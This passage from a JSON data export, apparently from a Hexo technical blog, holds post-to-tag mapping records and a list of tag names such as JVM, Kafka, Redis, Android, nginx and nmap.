","tag_id":"cjgrjscxg000iyp0l4ctzv4k2","_id":"cjgrjsczo002oyp0l1lgzo98v"},{"post_id":"cjgrjscx3000byp0lsj5xwz9r","tag_id":"cjgrjscza002byp0lnnfg7hp8","_id":"cjgrjsczq002syp0l9b5bf5s2"},{"post_id":"cjgrjscxb000fyp0lzf5x8yu0","tag_id":"cjgrjscy7001ayp0lxxy2qj8u","_id":"cjgrjsczz0033yp0lzux145fi"},{"post_id":"cjgrjscxb000fyp0lzf5x8yu0","tag_id":"cjgrjscyo001pyp0l29vx3xa1","_id":"cjgrjsd000036yp0lgu7mny3t"},{"post_id":"cjgrjscxb000fyp0lzf5x8yu0","tag_id":"cjgrjsczs002vyp0lib0e350b","_id":"cjgrjsd06003ayp0l17e7pnnu"},{"post_id":"cjgrjscxe000hyp0lkt1opimv","tag_id":"cjgrjsczx0031yp0lzn7x1mfb","_id":"cjgrjsd0a003hyp0lg4lm8luy"},{"post_id":"cjgrjscxe000hyp0lkt1opimv","tag_id":"cjgrjsd010037yp0lj88lm86t","_id":"cjgrjsd0c003kyp0lw4ebro5z"},{"post_id":"cjgrjscxj000myp0loo082h8o","tag_id":"cjgrjsd08003fyp0lrnrqcgce","_id":"cjgrjsd0u004byp0l7zow7y4i"},{"post_id":"cjgrjscxj000myp0loo082h8o","tag_id":"cjgrjsd0f003nyp0lp5cl6647","_id":"cjgrjsd0u004dyp0lif1gcjl7"},{"post_id":"cjgrjscxj000myp0loo082h8o","tag_id":"cjgrjsd0k003syp0l1r3y5vdd","_id":"cjgrjsd0u004fyp0lry1k6x4l"},{"post_id":"cjgrjscxj000myp0loo082h8o","tag_id":"cjgrjsd0n003yyp0llr2q2tjy","_id":"cjgrjsd0u004gyp0luktnnp50"},{"post_id":"cjgrjscxj000myp0loo082h8o","tag_id":"cjgrjsd0t0045yp0ls1ytl5xa","_id":"cjgrjsd0v004iyp0lfa2kfae7"},{"post_id":"cjgrjscxj000myp0loo082h8o","tag_id":"cjgrjsd0t0048yp0lbpf7vc9a","_id":"cjgrjsd0v004jyp0l572rpp79"},{"post_id":"cjgrjscxm000qyp0lvuw6uppn","tag_id":"cjgrjsd0u004ayp0l5fble8iq","_id":"cjgrjsd0v004myp0lhn7m3031"},{"post_id":"cjgrjscxm000qyp0lvuw6uppn","tag_id":"cjgrjsd0u004eyp0lewd7shaa","_id":"cjgrjsd0v004nyp0ln64f50j2"},{"post_id":"cjgrjscxm000qyp0lvuw6uppn","tag_id":"cjgrjsd0v004hyp0l0f1p9oyd","_id":"cjgrjsd0v004pyp0lkzqqxsz8"},{"post_id":"cjgrjscxm000qyp0lvuw6uppn","tag_id":"cjgrjsd0v004kyp0lc8x36jva","_id":"cjgrjsd0v004qyp0lsoxpe29j"},{"post_id":"cjgrjscxp000typ0lg5svzqs3","tag_id":"cjgrjsd0v004lyp0legnnax0b","_id":"cjgrjsd0w004typ0lunx7tisp"},{"post_id":"cjgrjscxp000typ0lg5svzqs3","tag_id":"cjgrjsd0v004oyp0lpl3qe17i","_id":"cjgrjsd0w004uyp0lsi3s61fq"},{"post_id":"cjgrjscxp000typ0lg5svzqs3","tag_id":"cjgrjsd0v004ryp0l6rof33zt","_id":"cjgrjsd0x004wyp0lked1io5l"},{"post_id":"cjgrjscxu000yyp0l60yyhqna","tag_id":"cjgrjsd0w004syp0l17ct2t27","_id":"cjgrjsd0x004xyp0l2lyaxyta"},{"post_id":"cjgrjscxx0010yp0l9fi4yxpy","tag_id":"cjgrjsd0w004vyp0l48rvbeup","_id":"cjgrjsd0y0051yp0l460p9wfc"},{"post_id":"cjgrjscxx0010yp0l9fi4yxpy","tag_id":"cjgrjsd0x004yyp0ltd7hyj2o","_id":"cjgrjsd0y0052yp0lg37vy3l7"},{"post_id":"cjgrjscxx0010yp0l9fi4yxpy","tag_id":"cjgrjscyo001pyp0l29vx3xa1","_id":"cjgrjsd0z0054yp0l5mxb2whp"},{"post_id":"cjgrjscy00014yp0ltl4n16zs","tag_id":"cjgrjsd0x0050yp0lbr58w3hn","_id":"cjgrjsd0z0056yp0lcc1abw37"},{"post_id":"cjgrjscy00014yp0ltl4n16zs","tag_id":"cjgrjsd0y0053yp0l7zbnf4xr","_id":"cjgrjsd0z0057yp0lj2cfjgsc"},{"post_id":"cjgrjscy20016yp0lyts6u1ss","tag_id":"cjgrjsd0z0055yp0lhb1gjtq0","_id":"cjgrjsd100059yp0l16aoeqhq"},{"post_id":"cjgrjscy60019yp0l1k0d62gf","tag_id":"cjgrjsd0z0058yp0lfhk2rnr5","_id":"cjgrjsd10005byp0lrtsttwx6"},{"post_id":"cjgrjscy8001dyp0lp5sf903j","tag_id":"cjgrjsd10005ayp0lzt8q0tq5","_id":"cjgrjsd10005dyp0lipqn3h3b"},{"post_id":"cjgrjscyc001gyp0luqm27w6b","tag_id":"cjgrjsd10005cyp0l7awtmbvb","_id":"cjgrjsd11005jyp0ltppjt68w"},{"post_id":"cjgrjscyc001gyp0luqm27w6b","tag_id":"cjgrjsd11005eyp0l91ykrgw8","_id":"cjgrjsd11005kyp0l338mr0cn"},{"post_id":"cjgrjscyc001gyp0luqm27w6b","tag_id":"cjgrjsd11005fyp0linmep53q","_id":"cjgrjsd12005myp0lfmp8be0z"},{"post_id":"cjgrjscyc001gyp0luqm27w6b","tag_id":"cjgrjsd11005gyp0lxb4ged3v","_id":"cjgrjsd12005nyp0ldgkyj170"},{"post_id":"cjgrjscyc001gyp0luqm27w6b","tag_id":"cjgrjsd11005hyp0l9ficatpc","_id":"cjgrjsd12005pyp0lvy8t9v4p"},{"post_id":"cjgrjscyj001lyp0la64mlkva","tag_id":"cjgrjsd11005iyp0li9h5v2su","_id":"cjgrjsd12005qyp0lrym310py"},{"post_id":"cjgrjscym001nyp0lh832oe1p","tag_id":"cjgrjsd12005lyp0l77y7lt44","_id":"cjgrjsd12005syp0lkpvtnspo"},{"post_id":"cjgrjscym001nyp0lh832oe1p","tag_id":"cjgrjsd12005oyp0lbjv7k4mm","_id":"cjgrjsd12005typ0lqczig35o"},{"post_id":"cjgrjscyo001ryp0lxr5pi3td","tag_id":"cjgrjsd12005ryp0ltuaqeo7q","_id":"cjgrjsd13005vyp0l6jk9z5hu"},{"post_id":"cjgrjscyu001typ0lsbtfuhfi","tag_id":"cjgrjsd12005ryp0ltuaqeo7q","_id":"cjgrjsd13005yyp0lfirqkkct"},{"post_id":"cjgrjscyu001typ0lsbtfuhfi","tag_id":"cjgrjsd13005wyp0ljnoqkgxl","_id":"cjgrjsd13005zyp0lwrl5js40"},{"post_id":"cjgrjscyy001xyp0lzclwqfm8","tag_id":"cjgrjsd13005xyp0lchd0m71l","_id":"cjgrjsd140061yp0ld1ypanvi"},{"post_id":"cjgrjscz50025yp0ljkznnbh2","tag_id":"cjgrjsd130060yp0lwg0olmf0","_id":"cjgrjsd140065yp0lenwb2787"},{"post_id":"cjgrjscz50025yp0ljkznnbh2","tag_id":"cjgrjsd140062yp0ldj16my7w","_id":"cjgrjsd140066yp0l85ps1er6"},{"post_id":"cjgrjscz50025yp0ljkznnbh2","tag_id":"cjgrjsd0x0050yp0lbr58w3hn","_id":"cjgrjsd150068yp0lt2h5teiq"},{"post_id":"cjgrjscza002cyp0l7n5kqufc","tag_id":"cjgrjsd140064yp0l5eeef465","_id":"cjgrjsd150069yp0lcrfqpvmq"},{"post_id":"cjgrjsczh002hyp0lkjxfqo1c","tag_id":"cjgrjsd11005hyp0l9ficatpc","_id":"cjgrjsd15006byp0l3cc66pja"},{"post_id":"cjgrjsczo002pyp0lkzn1n3h6","tag_id":"cjgrjsd15006ayp0lt6pedtwv","_id":"cjgrjsd17006eyp0l097ky3oj"},{"post_id":"cjgrjsczo002pyp0lkzn1n3h6","tag_id":"cjgrjsd11005gyp0lxb4ged3v","_id":"cjgrjsd17006fyp0lh595ge1j"},{"post_id":"cjgrjsczq002typ0lpz6rclht","tag_id":"cjgrjsd10005cyp0l7awtmbvb","_id":"cjgrjsd18006jyp0l6w8gczek"},{"post_id":"cjgrjsczq002typ0lpz6rclht","tag_id":"cjgrjsd17006gyp0lrkwif7zc","_id":"cjgrjsd18006kyp0lf2gmszom"},{"post_id":"cjgrjsczq002typ0lpz6rclht","tag_id":"cjgrjsd17006hyp0lo9s145g3","_id":"cjgrjsd19006myp0lkbqh083t"},{"post_id":"cjgrjsczt002yyp0lksad4tyd","tag_id":"cjgrjsd18006iyp0l8iyldqrf","_id":"cjgrjsd19006oyp0l9m8mrb5n"},{"post_id":"cjgrjsczt002yyp0lksad4tyd","tag_id":"cjgrjsd18006lyp0lmvi4lmfj","_id":"cjgrjsd19006pyp0lqlm3f9v7"},{"post_id":"cjgrjsczv0030yp0l5pye5wka","tag_id":"cjgrjsd19006nyp0loedt3p59","_id":"cjgrjsd1a006ryp0lo2rxq0qw"},{"post_id":"cjgrjsczx0032yp0lyqllcgld","tag_id":"cjgrjsd19006qyp0lswd0f137","_id":"cjgrjsd1b006typ0lzh6papkk"},{"post_id":"cjgrjsczz0035yp0l6mf3y2gk","tag_id":"cjgrjsd0x0050yp0lbr58w3hn","_id":"cjgrjsd1b006wyp0l9dzh0q2v"},{"post_id":"cjgrjsczz0035yp0l6mf3y2gk","tag_id":"cjgrjsd0u004ayp0l5fble8iq","_id":"cjgrjsd1b006xyp0loaa4vrm8"},{"post_id":"cjgrjsd010039yp0l8vgwe603","tag_id":"cjgrjsd1b006vyp0lwhk51ptz","_id":"cjgrjsd1d0071yp0lmnv88j38"},{"post_id":"cjgrjsd010039yp0l8vgwe603","tag_id":"cjgrjsd1b006yyp0l53yxddgf","_id":"cjgrjsd1d0072yp0l69f0u4q9"},{"post_id":"cjgrjsd010039yp0l8vgwe603","tag_id":"cjgrjsd1c006zyp0l0g1m7yr8","_id":"cjgrjsd1d0074yp0lc601h0mt"},{"post_id":"cjgrjsd06003cyp0lzrczy6b2","tag_id":"cjgrjsd10005cyp0l7awtmbvb","_id":"cjgrjsd1e0076yp0liphci9rg"},{"post_id":"cjgrjsd06003cyp0lzrczy6b2","tag_id":"cjgrjsd1d0073yp0lpioiqqa3","_id":"cjgrjsd1e0077yp0lrwkpr7ak"},{"post_id":"cjgrjsd09003gyp0ld5noebew","tag_id":"cjgrjsd130060yp0lwg0olmf0","_id":"cjgrjsd1f007cyp0llhez0ulg"},{"post_id":"cjgrjsd09003gyp0ld5noebew","tag_id":"cjgrjsd0u004ayp0l5fble8iq","_id":"cjgrjsd1f007dyp0lro3tlio8"},{"post_id":"cjgrjsd09003gyp0ld5noebew","tag_id":"cjgrjsd17006gyp0lrkwif7zc","_id":"cjgrjsd1g007fyp0lj3eyiux6"},{"post_id":"cjgrjsd09003gyp0ld5noebew","tag_id":"cjgrjsd1f007ayp0lddld1n5n","_id":"cjgrjsd1g007gyp0l5h8cviux"},{"post_id":"cjgrjsd0d003lyp0lxqlek4i9","tag_id":"cjgrjscy7001ayp0lxxy2qj8u","_id":"cjgrjsd1g007iyp0li2kei1xc"},{"post_id":"cjgrjsd0d003lyp0lxqlek4i9","tag_id":"cjgrjsd1f007byp0lz2fvv5v8","_id":"cjgrjsd1g007jyp0ltocu03u1"},{"post_id":"cjgrjsd0f003pyp0l59k0567o","tag_id":"cjgrjsd1f007eyp0lbunushp0","_id":"cjgrjsd1h007lyp0lp05cyjki"},{"post_id":"cjgrjsd0f003pyp0l59k0567o","tag_id":"cjgrjsd1g007hyp0l4dx61ibh","_id":"cjgrjsd1h007myp0ll0958yfe"},{"post_id":"cjgrjsd0i003ryp0lm5q2z2n5","tag_id":"cjgrjsd1g007kyp0lbo4xu80w","_id":"cjgrjsd1h007oyp0l8bhbfq45"},{"post_id":"cjgrjsd0k003uyp0ln48n8kg6","tag_id":"cjgrjsd11005fyp0linmep53q","_id":"cjgrjsd1i007ryp0lekbwp4nq"},{"post_id":"cjgrjsd0k003uyp0ln48n8kg6","tag_id":"cjgrjsd1i007pyp0lt3mhnw20","_id":"cjgrjsd1j007syp0lkdy1uggc"},{"post_id":"cjgrjsd0m003xyp0lgilq4r1r","tag_id":"cjgrjsd0w004vyp0l48rvbeup","_id":"cjgrjsd1j007uyp0lrqunx9hz"},{"post_id":"cjgrjsd0n0040yp0l05wxewfr","tag_id":"cjgrjsd1j007typ0lykwhbzon","_id":"cjgrjsd1k007wyp0l66j8wa21"},{"post_id":"cjgrjsd0r0042yp0ld85a2zg2","tag_id":"cjgrjsd1j007vyp0luxrx26i0","_id":"cjgrjsd1k007yyp0l9xicpm93"},{"post_id":"cjgrjsd0r0042yp0ld85a2zg2","tag_id":"cjgrjsd1k007xyp0letj2lm1u","_id":"cjgrjsd1k007zyp0ldttiou95"}],"Tag":[{"name":"Android数据传输","_id":"cjgrjscwn0004yp0l41kx8w7j"},{"name":"JVM","_id":"cjgrjscx2000ayp0l27lxfec0"},{"name":"GC","_id":"cjgrjscxg000iyp0l4ctzv4k2"},{"name":"GET","_id":"cjgrjscxk000nyp0lif8luwa2"},{"name":"POST","_id":"cjgrjscxu000wyp0lzu4f2pl0"},{"name":"HTTP","_id":"cjgrjscy00013yp0lru8g1kzp"},{"name":"Java","_id":"cjgrjscy7001ayp0lxxy2qj8u"},{"name":"Object","_id":"cjgrjscye001iyp0lwxg430wd"},{"name":"线程","_id":"cjgrjscyo001pyp0l29vx3xa1"},{"name":"JMM","_id":"cjgrjscza002byp0lnnfg7hp8"},{"name":"Happens-Before","_id":"cjgrjsczs002vyp0lib0e350b"},{"name":"Thread","_id":"cjgrjsczx0031yp0lzn7x1mfb"},{"name":"线程池","_id":"cjgrjsd010037yp0lj88lm86t"},{"name":"static","_id":"cjgrjsd08003fyp0lrnrqcgce"},{"name":"final","_id":"cjgrjsd0f003nyp0lp5cl6647"},{"name":"synchronized","_id":"cjgrjsd0k003syp0l1r3y5vdd"},{"name":"hashCode","_id":"cjgrjsd0n003yyp0llr2q2tjy"},{"name":"equals","_id":"cjgrjsd0t0045yp0ls1ytl5xa"},{"name":"Collection","_id":"cjgrjsd0t0048yp0lbpf7vc9a"},{"name":"Kafka","_id":"cjgrjsd0u004ayp0l5fble8iq"},{"name":"持久化","_id":"cjgrjsd0u004eyp0lewd7shaa"},{"name":"备份","_id":"cjgrjsd0v004hyp0l0f1p9oyd"},{"name":"日志压缩","_id":"cjgrjsd0v004kyp0lc8x36jva"},{"name":"redis持久化","_id":"cjgrjsd0v004lyp0legnnax0b"},{"name":"redis RDB","_id":"cjgrjsd0v004oyp0lpl3qe17i"},{"name":"redis AOF","_id":"cjgrjsd0v004ryp0l6rof33zt"},{"name":"Android Intent","_id":"cjgrjsd0w004syp0l17ct2t27"},{"name":"Android","_id":"cjgrjsd0w004vyp0l48rvbeup"},{"name":"ProgressBar","_id":"cjgrjsd0x004yyp0ltd7hyj2o"},{"name":"Zookeeper","_id":"cjgrjsd0x0050yp0lbr58w3hn"},{"name":"FastLeaderElection","_id":"cjgrjsd0y0053yp0l7zbnf4xr"},{"name":"hexo搭建","_id":"cjgrjsd0z0055yp0lhb1gjtq0"},{"name":"Android生命周期","_id":"cjgrjsd0z0058yp0lfhk2rnr5"},{"name":"Android Handler","_id":"cjgrjsd10005ayp0lzt8q0tq5"},{"name":"centos","_id":"cjgrjsd10005cyp0l7awtmbvb"},{"name":"firewall","_id":"cjgrjsd11005eyp0l91ykrgw8"},{"name":"lnmp","_id":"cjgrjsd11005fyp0linmep53q"},{"name":"python","_id":"cjgrjsd11005gyp0lxb4ged3v"},{"name":"laravel","_id":"cjgrjsd11005hyp0l9ficatpc"},{"name":"Docker","_id":"cjgrjsd11005iyp0li9h5v2su"},{"name":"disqus","_id":"cjgrjsd12005lyp0l77y7lt44"},{"name":"duoshuo","_id":"cjgrjsd12005oyp0lbjv7k4mm"},{"name":"git","_id":"cjgrjsd12005ryp0ltuaqeo7q"},{"name":"github","_id":"cjgrjsd13005wyp0ljnoqkgxl"},{"name":"hexo","_id":"cjgrjsd13005xyp0lchd0m71l"},{"name":"hadoop","_id":"cjgrjsd130060yp0lwg0olmf0"},{"name":"Hbase","_id":"cjgrjsd140062yp0ldj16my7w"},{"name":"logrotate","_id":"cjgrjsd140064yp0l5eeef465"},{"name":"nmap","_id":"cjgrjsd15006ayp0lt6pedtwv"},{"name":"storm","_id":"cjgrjsd17006gyp0lrkwif7zc"},{"name":"zookeeper","_id":"cjgrjsd17006hyp0lo9s145g3"},{"name":"vim","_id":"cjgrjsd18006iyp0l8iyldqrf"},{"name":"ubuntu","_id":"cjgrjsd18006lyp0lmvi4lmfj"},{"name":"unix时间","_id":"cjgrjsd19006nyp0loedt3p59"},{"name":"zabbix","_id":"cjgrjsd19006qyp0lswd0f137"},{"name":"apache","_id":"cjgrjsd1b006vyp0lwhk51ptz"},{"name":"nginx","_id":"cjgrjsd1b006yyp0l53yxddgf"},{"name":"Shadowsocks","_id":"cjgrjsd1c006zyp0l0g1m7yr8"},{"name":"代码注入","_id":"cjgrjsd1d0073yp0lpioiqqa3"},{"name":"spark","_id":"cjgrjsd1f007ayp0lddld1n5n"},{"name":"C++","_id":"cjgrjsd1f007byp0lz2fvv5v8"},{"name":"SQL","_id":"cjgrjsd1f007eyp0lbunushp0"},{"name":"索引","_id":"cjgrjsd1g007hyp0l4dx61ibh"},{"name":"数据结构","_id":"cjgrjsd1g007kyp0lbo4xu80w"},{"name":"mysql","_id":"cjgrjsd1i007pyp0lt3mhnw20"},{"name":"爬虫","_id":"cjgrjsd1j007typ0lykwhbzon"},{"name":"桥接","_id":"cjgrjsd1j007vyp0luxrx26i0"},{"name":"抽象","_id":"cjgrjsd1k007xyp0letj2lm1u"}]}}